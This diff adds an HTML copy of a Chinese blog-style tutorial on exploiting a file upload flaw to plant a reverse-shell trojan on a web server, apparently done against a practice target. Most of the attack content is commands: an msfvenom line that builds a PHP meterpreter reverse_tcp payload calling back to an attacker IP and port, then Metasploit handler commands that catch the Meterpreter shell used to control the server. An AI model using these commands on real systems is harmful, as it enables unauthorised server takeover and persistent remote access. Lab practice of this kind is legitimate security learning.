@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>利用文件上传漏洞在Web服务器里种植反射木马</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>利用文件上传漏洞在Web服务器里种植反射木马</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&amp;mid=2650744261&amp;idx=1&amp;sn=c4d76d3c344ce2030250ea72d6ec3747&amp;chksm=871484c5b0630dd3c78ec9588d122261ff04418c1751e4fb061df24ad778c43477fc06452c9a&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&amp;mid=2650744261&amp;idx=1&amp;sn=c4d76d3c344ce2030250ea72d6ec3747&amp;chksm=871484c5b0630dd3c78ec9588d122261ff04418c1751e4fb061df24ad778c43477fc06452c9a&amp;scene=27#wechat_redirect</a></blockquote><p>Web服务器基本都是藏在防火墙后面的，即使通过漏洞利用拿下了，开了木马端口也访问不进去，本周末实践的是，利用文件上传漏洞在Web服务器里种植反射木马，</p><p>在Metasploit下制作木马文件， <br/>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.128.100 LPORT=8080 -f raw &gt; test.php</p><p>把木马文件上传到靶机，</p><p><img data-ratio="1.7920792079207921" data-type="png" data-src="https://mmbiz.qpic.cn/mmbiz_png/F6TniceRacJ32rB8eaiaHLOmYVrDJtZsHds1OrECYgzQTfaDdIND3Eib08KOOPyNdiats671QuTgwWTUvFztjNbHjQ/0?wx_fmt=png" data-s="300,640" data-w="404" src="../Images/8ac374b605006613ea9ce0d9eeb0620f.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/F6TniceRacJ32rB8eaiaHLOmYVrDJtZsHds1OrECYgzQTfaDdIND3Eib08KOOPyNdiats671QuTgwWTUvFztjNbHjQ/0?wx_fmt=png"/></p><p>在Metasploit下开启一个监听，<br/>use exploit/multi/handler<br/>set payload php/meterpreter/reverse_tcp<br/>set LHOST 192.168.128.100<br/>set LPORT 8080<br/>exploit</p><p>从外面访问木马URL，</p><p><img data-ratio="0.433" data-type="png" data-src="https://mmbiz.qpic.cn/mmbiz_png/F6TniceRacJ32rB8eaiaHLOmYVrDJtZsHdXDmx4vRGARic5yaLxbY0WBAmRYzgTa5kZ0y9E6B4MColhkJgwMH1cSQ/0?wx_fmt=png" data-s="300,640" data-w="1000" src="../Images/158560e119e9d4812693964c544735b4.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/F6TniceRacJ32rB8eaiaHLOmYVrDJtZsHdXDmx4vRGARic5yaLxbY0WBAmRYzgTa5kZ0y9E6B4MColhkJgwMH1cSQ/0?wx_fmt=png"/></p><p>看到反射出来的Meterpreter Shell，</p><p><img data-ratio="0.579175704989154" data-type="png" data-src="https://mmbiz.qpic.cn/mmbiz_png/F6TniceRacJ32rB8eaiaHLOmYVrDJtZsHdYMK0xgauiaFk89T3jTeCJ1iclBV46vnl1UtZNoZWjskpvoicjDWF5enibA/0?wx_fmt=png" data-s="300,640" data-w="922" src="../Images/d3cb176237046a398eab6e6f330ffb96.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/F6TniceRacJ32rB8eaiaHLOmYVrDJtZsHdYMK0xgauiaFk89T3jTeCJ1iclBV46vnl1UtZNoZWjskpvoicjDWF5enibA/0?wx_fmt=png"/></p><p>即可控制Web服务器，</p><p><img data-ratio="0.5725190839694656" data-type="png" data-src="https://mmbiz.qpic.cn/mmbiz_png/F6TniceRacJ32rB8eaiaHLOmYVrDJtZsHdkNQ3YibicIYFRH7iaJjxlL3VPOysdcYAib1OBHOBlTyDbBxUlarbJict1vg/0?wx_fmt=png" data-s="300,640" data-w="917" src="../Images/e092eccd9ccab4ab8f175e47b2288573.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/F6TniceRacJ32rB8eaiaHLOmYVrDJtZsHdkNQ3YibicIYFRH7iaJjxlL3VPOysdcYAib1OBHOBlTyDbBxUlarbJict1vg/0?wx_fmt=png"/></p><p><br/></p>
+        
+</body>
+</html>
